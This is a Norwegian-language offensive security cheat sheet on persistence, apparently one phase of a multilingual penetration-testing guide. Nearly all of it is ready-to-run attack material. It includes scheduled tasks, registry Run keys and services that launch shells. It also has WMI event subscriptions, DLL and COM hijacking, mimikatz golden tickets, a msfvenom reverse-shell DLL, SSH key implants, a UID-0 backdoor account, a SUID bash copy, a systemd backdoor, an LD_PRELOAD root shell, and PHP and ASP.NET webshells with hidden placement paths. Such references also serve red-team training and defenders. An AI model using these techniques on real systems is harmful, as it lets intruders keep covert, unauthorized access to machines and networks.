# 🔒 Fase 5: Vedvarende tilgang

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](05-Persistence.tr.md) • [🇬🇷 Ελληνικά](05-Persistence.el.md)

```
  ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗███████╗███╗   ██╗ ██████╗███████╗
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   █████╗  ██╔██╗ ██║██║     █████╗  
  ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║     ██╔══╝  
  ██║     ███████╗██║  ██║███████║██║███████║   ██║   ███████╗██║ ╚████║╚██████╗███████╗
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
```

**Mål:** Beholde tilgangen til det kompromitterte systemet etter omstart eller oppdagelse.

---

## 🖥️ Vedvarende tilgang i Windows

### Planlagte oppgaver
```cmd
# Opprett planlagt oppgave (kjører som SYSTEM)
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM

# Med en bestemt bruker
schtasks /create /tn "Updater" /tr "powershell -ep bypass -w hidden -c IEX(payload)" /sc onlogon /ru username

# Ved oppstart
schtasks /create /tn "Maintenance" /tr "C:\temp\beacon.exe" /sc onstart /ru SYSTEM

# Hver time
schtasks /create /tn "Sync" /tr "C:\temp\shell.exe" /sc hourly /mo 1

# List oppgaver
schtasks /query /fo LIST /v

# Slett oppgave
schtasks /delete /tn "TaskName" /f
```

### Run-nøkler i registeret
```cmd
# HKCU – gjeldende bruker (krever ikke administrator)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\shell.exe"

# HKLM – alle brukere (krever administrator)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\beacon.exe"

# RunOnce (kjøres én gang, deretter slettes oppføringen)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "powershell -c IEX(payload)"

# PowerShell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\temp\shell.exe"
```

### Oppstartsmappe
```cmd
# Gjeldende bruker
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# Alle brukere (krever administrator)
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

# PowerShell
Copy-Item shell.exe -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Tjenester
```cmd
# Opprett tjeneste (krever administrator)
sc create EvilService binPath= "C:\temp\shell.exe" start= auto
sc start EvilService

# Endre eksisterende tjeneste
sc config VulnService binPath= "C:\temp\shell.exe"

# PowerShell
New-Service -Name "WindowsHelper" -BinaryPathName "C:\temp\beacon.exe" -StartupType Automatic
Start-Service WindowsHelper
```

### WMI-hendelsesabonnementer
```powershell
# Opprett vedvarende tilgang med WMI
$FilterArgs = @{
    Name = 'EvilFilter'
    EventNameSpace = 'root\CimV2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute = 00"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'EvilConsumer'
    CommandLineTemplate = 'C:\temp\shell.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

### DLL-kapring og søkerekkefølge
```cmd
# Finn muligheter for DLL-kapring
# Plasser en ondsinnet DLL i applikasjonens mappe
# Vanlige mål:
# - Programfiler uten fullstendige DLL-stier
# - Manglende DLL-er

# Opprett en ondsinnet DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### COM-kapring
```powershell
# Finn COM-objekter
reg query "HKCU\Software\Classes\CLSID" /s /f "InprocServer32"

# Opprett kapring
New-Item -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Name "(Default)" -Value "C:\temp\evil.dll"
```

### Golden/Silver Ticket
```powershell
# Golden ticket – vedvarende domeneadministratortilgang
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver ticket – vedvarende tjenestetilgang
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:HASH /ptt
```

---

## 🐧 Vedvarende tilgang i Linux

### Cron-jobber

> **Merknad til originalen:** Om `echo` tolker `\n` som linjeskift varierer mellom skall. Eksemplet som oppretter filen i `/etc/cron.hourly/` kan derfor gi en ugyldig skriptfil.
```bash
# Brukerens crontab
crontab -e
# Legg til: * * * * * /tmp/shell.sh

# Systemets crontab
echo "* * * * * root /tmp/shell" >> /etc/crontab

# Cron-mapper
echo "#!/bin/bash\n/tmp/shell" > /etc/cron.hourly/update
chmod +x /etc/cron.hourly/update
```

### SSH-nøkler
```bash
# Legg til din offentlige nøkkel i authorized_keys
echo "ssh-rsa AAAA...your_key... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Root-tilgang
echo "ssh-rsa AAAA...your_key..." >> /root/.ssh/authorized_keys
```

### Bakdørskonto
```bash
# Legg til bruker med root-rettigheter
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password" | chpasswd

# Eller legg til direkte i /etc/passwd
echo 'backdoor:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
```

### Binærfil med SUID
```bash
# Kopier bash og sett SUID
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden

# Kjør som root
/tmp/.hidden -p
```

### Systemd-tjeneste

> **Merknad:** `Description=System Service` er en bokstavelig konfigurasjonsverdi fra originalen og er bevart. Tilgang via `/tmp` forutsetter at filene overlever opprydding eller omstart.
```bash
# Opprett tjenestefil
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/tmp/shell
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Aktiver og start
systemctl daemon-reload
systemctl enable backdoor
systemctl start backdoor
```

### bashrc / profile
```bash
# Legg til i brukerens bashrc
echo '/tmp/shell &' >> ~/.bashrc

# Legg til i den globale profilen
echo '/tmp/shell &' >> /etc/profile

# Legg til i bash_profile
echo '/tmp/shell &' >> ~/.bash_profile
```

### LD_PRELOAD
```bash
# Opprett et ondsinnet delt bibliotek
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Legg til i LD_PRELOAD
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

### Webshell
```bash
# PHP-webshell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.shell.php

# Mer skjult
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /var/www/html/wp-includes/.config.php
```

---

## 🌐 Vedvarende tilgang via web

### Plasseringer for webshell
```bash
# Vanlige plasseringer for webshell
/var/www/html/.shell.php
/var/www/html/wp-content/uploads/.shell.php
/var/www/html/images/.shell.jpg.php
C:\inetpub\wwwroot\.shell.aspx
C:\inetpub\wwwroot\App_Data\shell.aspx
```

### ASP.NET-webshell
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>
```

---

## 📊 Hurtigreferanse

### Metoder for vedvarende tilgang i Windows

| Metode | Plassering | Rettighet |
|--------|----------|-----------|
| Run-nøkkel i registeret | HKCU/HKLM | Bruker/administrator |
| Planlagt oppgave | Oppgaveplanlegging | Bruker/administrator |
| Oppstartsmappe | AppData/ProgramData | Bruker/administrator |
| Tjeneste | Tjenester | Administrator |
| WMI | WMI-abonnement | Administrator |
| COM-kapring | HKCU CLSID | Bruker |

### Metoder for vedvarende tilgang i Linux

| Metode | Plassering | Rettighet |
|--------|----------|-----------|
| Cron | /etc/crontab | root |
| SSH-nøkler | ~/.ssh/authorized_keys | Bruker |
| SUID | Binærfil med +s | root |
| Systemd | /etc/systemd/system | root |
| bashrc | ~/.bashrc | Bruker |

---

## 🔗 Relaterte hurtigguider

- [PowerShell](../../PowerShell/README.md)
- [Linux-kommandoer](../../Linux-Commands/README.md)
- [Metasploit](../../Metasploit/README.md)

---

**Forrige fase:** [← 04 - Lateral bevegelse](./04-Lateral-Movement.nb.md)

**Neste fase:** [06 - Omgåelse av sikkerhetsmekanismer →](./06-Defense-Evasion.nb.md)
